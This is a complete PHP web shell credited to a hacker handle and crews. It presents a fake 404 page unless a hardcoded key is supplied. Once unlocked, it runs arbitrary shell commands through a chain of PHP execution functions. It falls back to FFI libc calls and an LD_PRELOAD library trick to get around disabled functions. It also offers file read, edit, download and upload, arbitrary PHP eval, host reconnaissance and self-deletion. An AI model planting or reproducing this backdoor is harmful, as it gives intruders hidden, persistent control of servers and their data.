<?php
/* =====================================================================
 * by MantanHacker | https://github.com/mantanhacker | nomatali.com
 * GantengersCrew, JavaneseTeam, Typical Idiot Security, IdiotCrew
 * ===================================================================== */

http_response_code(200);
header('Content-Type: text/html; charset=utf-8');
header('Content-Disposition: inline; filename=""');
header('Cache-Control: no-store');
header('X-Content-Type-Options: nosniff');
foreach (headers_list() as $_h) {
    if (stripos($_h, 'attachment') !== false || stripos($_h, 'octet-stream') !== false) {
        [$_hn] = explode(':', $_h, 2);
        @header_remove(trim($_hn));
    }
}
header('Content-Type: text/html; charset=utf-8');
header('Content-Disposition: inline; filename=""');

$KEY = 'sontoloyo';
$in   = $_REQUEST['k'] ?? $_COOKIE['k'] ?? '';
if (!is_string($in) || !hash_equals($KEY, $in)) {
    http_response_code(404);
    echo '<!DOCTYPE html><html><head><meta name="robots" content="noindex"><title>404 Not Found</title></head><body>'
       . '<h1>Not Found</h1><p>The requested URL was not found on this server.</p>'
       . '</body></html>';
    exit;
}

function x($c)
{
    $c  .= ' 2>&1';
    $out = null;
    foreach (['system', 'shell_exec', 'passthru', 'exec', 'popen', 'proc_open'] as $m) {
        if (!function_exists($m)) continue;
        try {
            switch ($m) {
                case 'system':     ob_start(); system($c);                    $out = ob_get_clean(); break;
                case 'shell_exec': $out = shell_exec($c);                                     break;
                case 'passthru':   ob_start(); passthru($c);  $out = ob_get_clean();         break;
                case 'exec':       $r = []; exec($c, $r);   $out = implode("\n", $r);        break;
                case 'popen':      $h = popen($c, 'r'); $out = stream_get_contents($h); pclose($h); break;
                case 'proc_open':
                    $p = proc_open($c, [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pi);
                    $out = stream_get_contents($pi[1]) . stream_get_contents($pi[2]);
                    proc_close($p);
                    break;
            }
            if ($out !== null && $out !== false) return $out;
        } catch (Throwable $e) { continue; }
    }

    if (class_exists('FFI')) {
        try {
            $ffi = FFI::cdef('int system(const char *command);', 'libc.so.6');
            ob_start(); $ffi->system($c); $o = ob_get_clean();
            if ($o !== false) return $o;
        } catch (Throwable $e) {}
    }

    $o = ldexec($c);
    if ($o !== null) return $o;

    return "[!] semua exec method disabled (FFI & LD_PRELOAD gagal)\n"
         . "disabled: " . ini_get('disable_functions');
}

function ldexec($c)
{
    $so = getenv('BD_SO') ?: __DIR__ . '/.bd.so';
    if (!is_readable($so)) return null;
    @putenv('BD_CMD=' . $c);
    @putenv('LD_PRELOAD=' . $so);
    @mail('x@localhost', 'x', 'x');
    @error_log('x', 1, 'x@localhost');
    $out = @file_get_contents('/tmp/.bd_out');
    @unlink('/tmp/.bd_out');
    return $out;
}

$A = $_REQUEST['a'] ?? 'home';
echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="robots" content="noindex"><title>.</title>'
   . '<style>body{background:#0d0d0d;color:#33ff33;font:13px monospace;padding:12px}'
   . 'button,input,textarea,select{background:#111;color:#33ff33;border:1px solid #33ff33;font:12px monospace}'
   . 'a{color:#33ff33}pre{background:#000;border:1px solid #1a1a1a;padding:8px;overflow:auto;max-height:72vh}</style>'
   . '</head><body>';
echo '<form method="post"><input name="k" type="hidden" value="' . $KEY . '">'
   . '<button name="a" value="cmd">cmd</button> '
   . '<button name="a" value="file">files</button> '
   . '<button name="a" value="ul">upload</button> '
   . '<button name="a" value="ev">eval</button> '
   . '<button name="a" value="info">info</button> '
   . '<button name="a" value="self">wipe</button></form><hr>';

switch ($A) {
    case 'cmd':
        $c = $_REQUEST['c'] ?? 'id; uname -a; pwd';
        echo '<form method="post"><input name="k" type="hidden" value="' . $KEY . '">'
           . '<input name="a" type="hidden" value="cmd">'
           . '<input name="c" size="96" value="' . htmlspecialchars($c) . '"> <button>run</button></form>'
           . '<pre>' . htmlspecialchars(x($c)) . '</pre>';
        break;

    case 'file':
        $p   = $_REQUEST['p'] ?? getcwd();
        $act = $_REQUEST['act'] ?? 'list';
        echo '<form method="post"><input name="k" type="hidden" value="' . $KEY . '">'
           . '<input name="a" type="hidden" value="file">'
           . '<input name="p" size="80" value="' . htmlspecialchars($p) . '"> '
           . '<button name="act" value="list">list</button>'
           . '<button name="act" value="read">read</button>'
           . '<button name="act" value="dl">dl</button></form>';
        if ($act === 'read' && is_file($p)) {
            echo '<form method="post"><input name="k" type="hidden" value="' . $KEY . '">'
               . '<input name="a" type="hidden" value="file">'
               . '<input name="act" type="hidden" value="save">'
               . '<input name="p" type="hidden" value="' . htmlspecialchars($p) . '">'
               . '<textarea name="content" rows="16" cols="120">' . htmlspecialchars(file_get_contents($p)) . '</textarea>'
               . '<br><button>save</button></form>';
        } elseif ($act === 'save' && isset($_REQUEST['content'])) {
            file_put_contents($p, $_REQUEST['content']);
            echo '<pre>saved -> ' . htmlspecialchars($p) . '</pre>';
        } elseif ($act === 'dl' && is_file($p)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($p) . '"');
            readfile($p);
            exit;
        } else {
            echo '<pre>';
            foreach ((array) @scandir($p) as $e) {
                $f = rtrim($p, '/') . '/' . $e;
                echo (is_dir($f) ? '[D] ' : '[F] ') . $e . "\n";
            }
            echo '</pre>';
        }
        break;

    case 'ul':
        if (isset($_FILES['f']) && is_uploaded_file($_FILES['f']['tmp_name'])) {
            $dst = getcwd() . '/' . basename($_FILES['f']['name']);
            move_uploaded_file($_FILES['f']['tmp_name'], $dst);
            echo '<pre>uploaded -> ' . $dst . '</pre>';
        }
        echo '<form method="post" enctype="multipart/form-data">'
           . '<input name="k" type="hidden" value="' . $KEY . '">'
           . '<input name="a" type="hidden" value="ul">'
           . '<input type="file" name="f"> <button>upload</button></form>';
        break;

    case 'ev':
        $code = $_REQUEST['code'] ?? 'echo PHP_OS;';
        echo '<form method="post"><input name="k" type="hidden" value="' . $KEY . '">'
           . '<input name="a" type="hidden" value="ev">'
           . '<textarea name="code" rows="6" cols="110">' . htmlspecialchars($code) . '</textarea>'
           . '<br><button>eval</button></form><pre>';
        eval($code);
        echo '</pre>';
        break;

    case 'info':
        echo '<pre>'
           . 'uname  : ' . x('uname -a')
           . 'id     : ' . x('id')
           . 'php    : ' . PHP_VERSION . ' | sapi: ' . php_sapi_name() . "\n"
           . 'cwd    : ' . getcwd() . "\n"
           . 'basedir: ' . (ini_get('open_basedir') ?: '-') . "\n"
           . 'disabled: ' . ini_get('disable_functions') . "\n"
           . 'so     : ' . (is_readable(__DIR__ . '/.bd.so') ? 'LOADED (LD_PRELOAD ready)' : 'missing (.bd.so)')
           . '</pre>';
        break;

    case 'self':
        if (($_REQUEST['ok'] ?? '') === '1') {
            @unlink(__FILE__);
            echo '<pre>wiped</pre>';
            exit;
        }
        echo '<form method="post"><input name="k" type="hidden" value="' . $KEY . '">'
           . '<input name="a" type="hidden" value="self"><input name="ok" type="hidden" value="1">'
           . '<button>WIPE ' . __FILE__ . '</button></form>';
        break;

    default:
        echo '<pre>ready. pilih menu.</pre>';
}
echo '</body></html>';
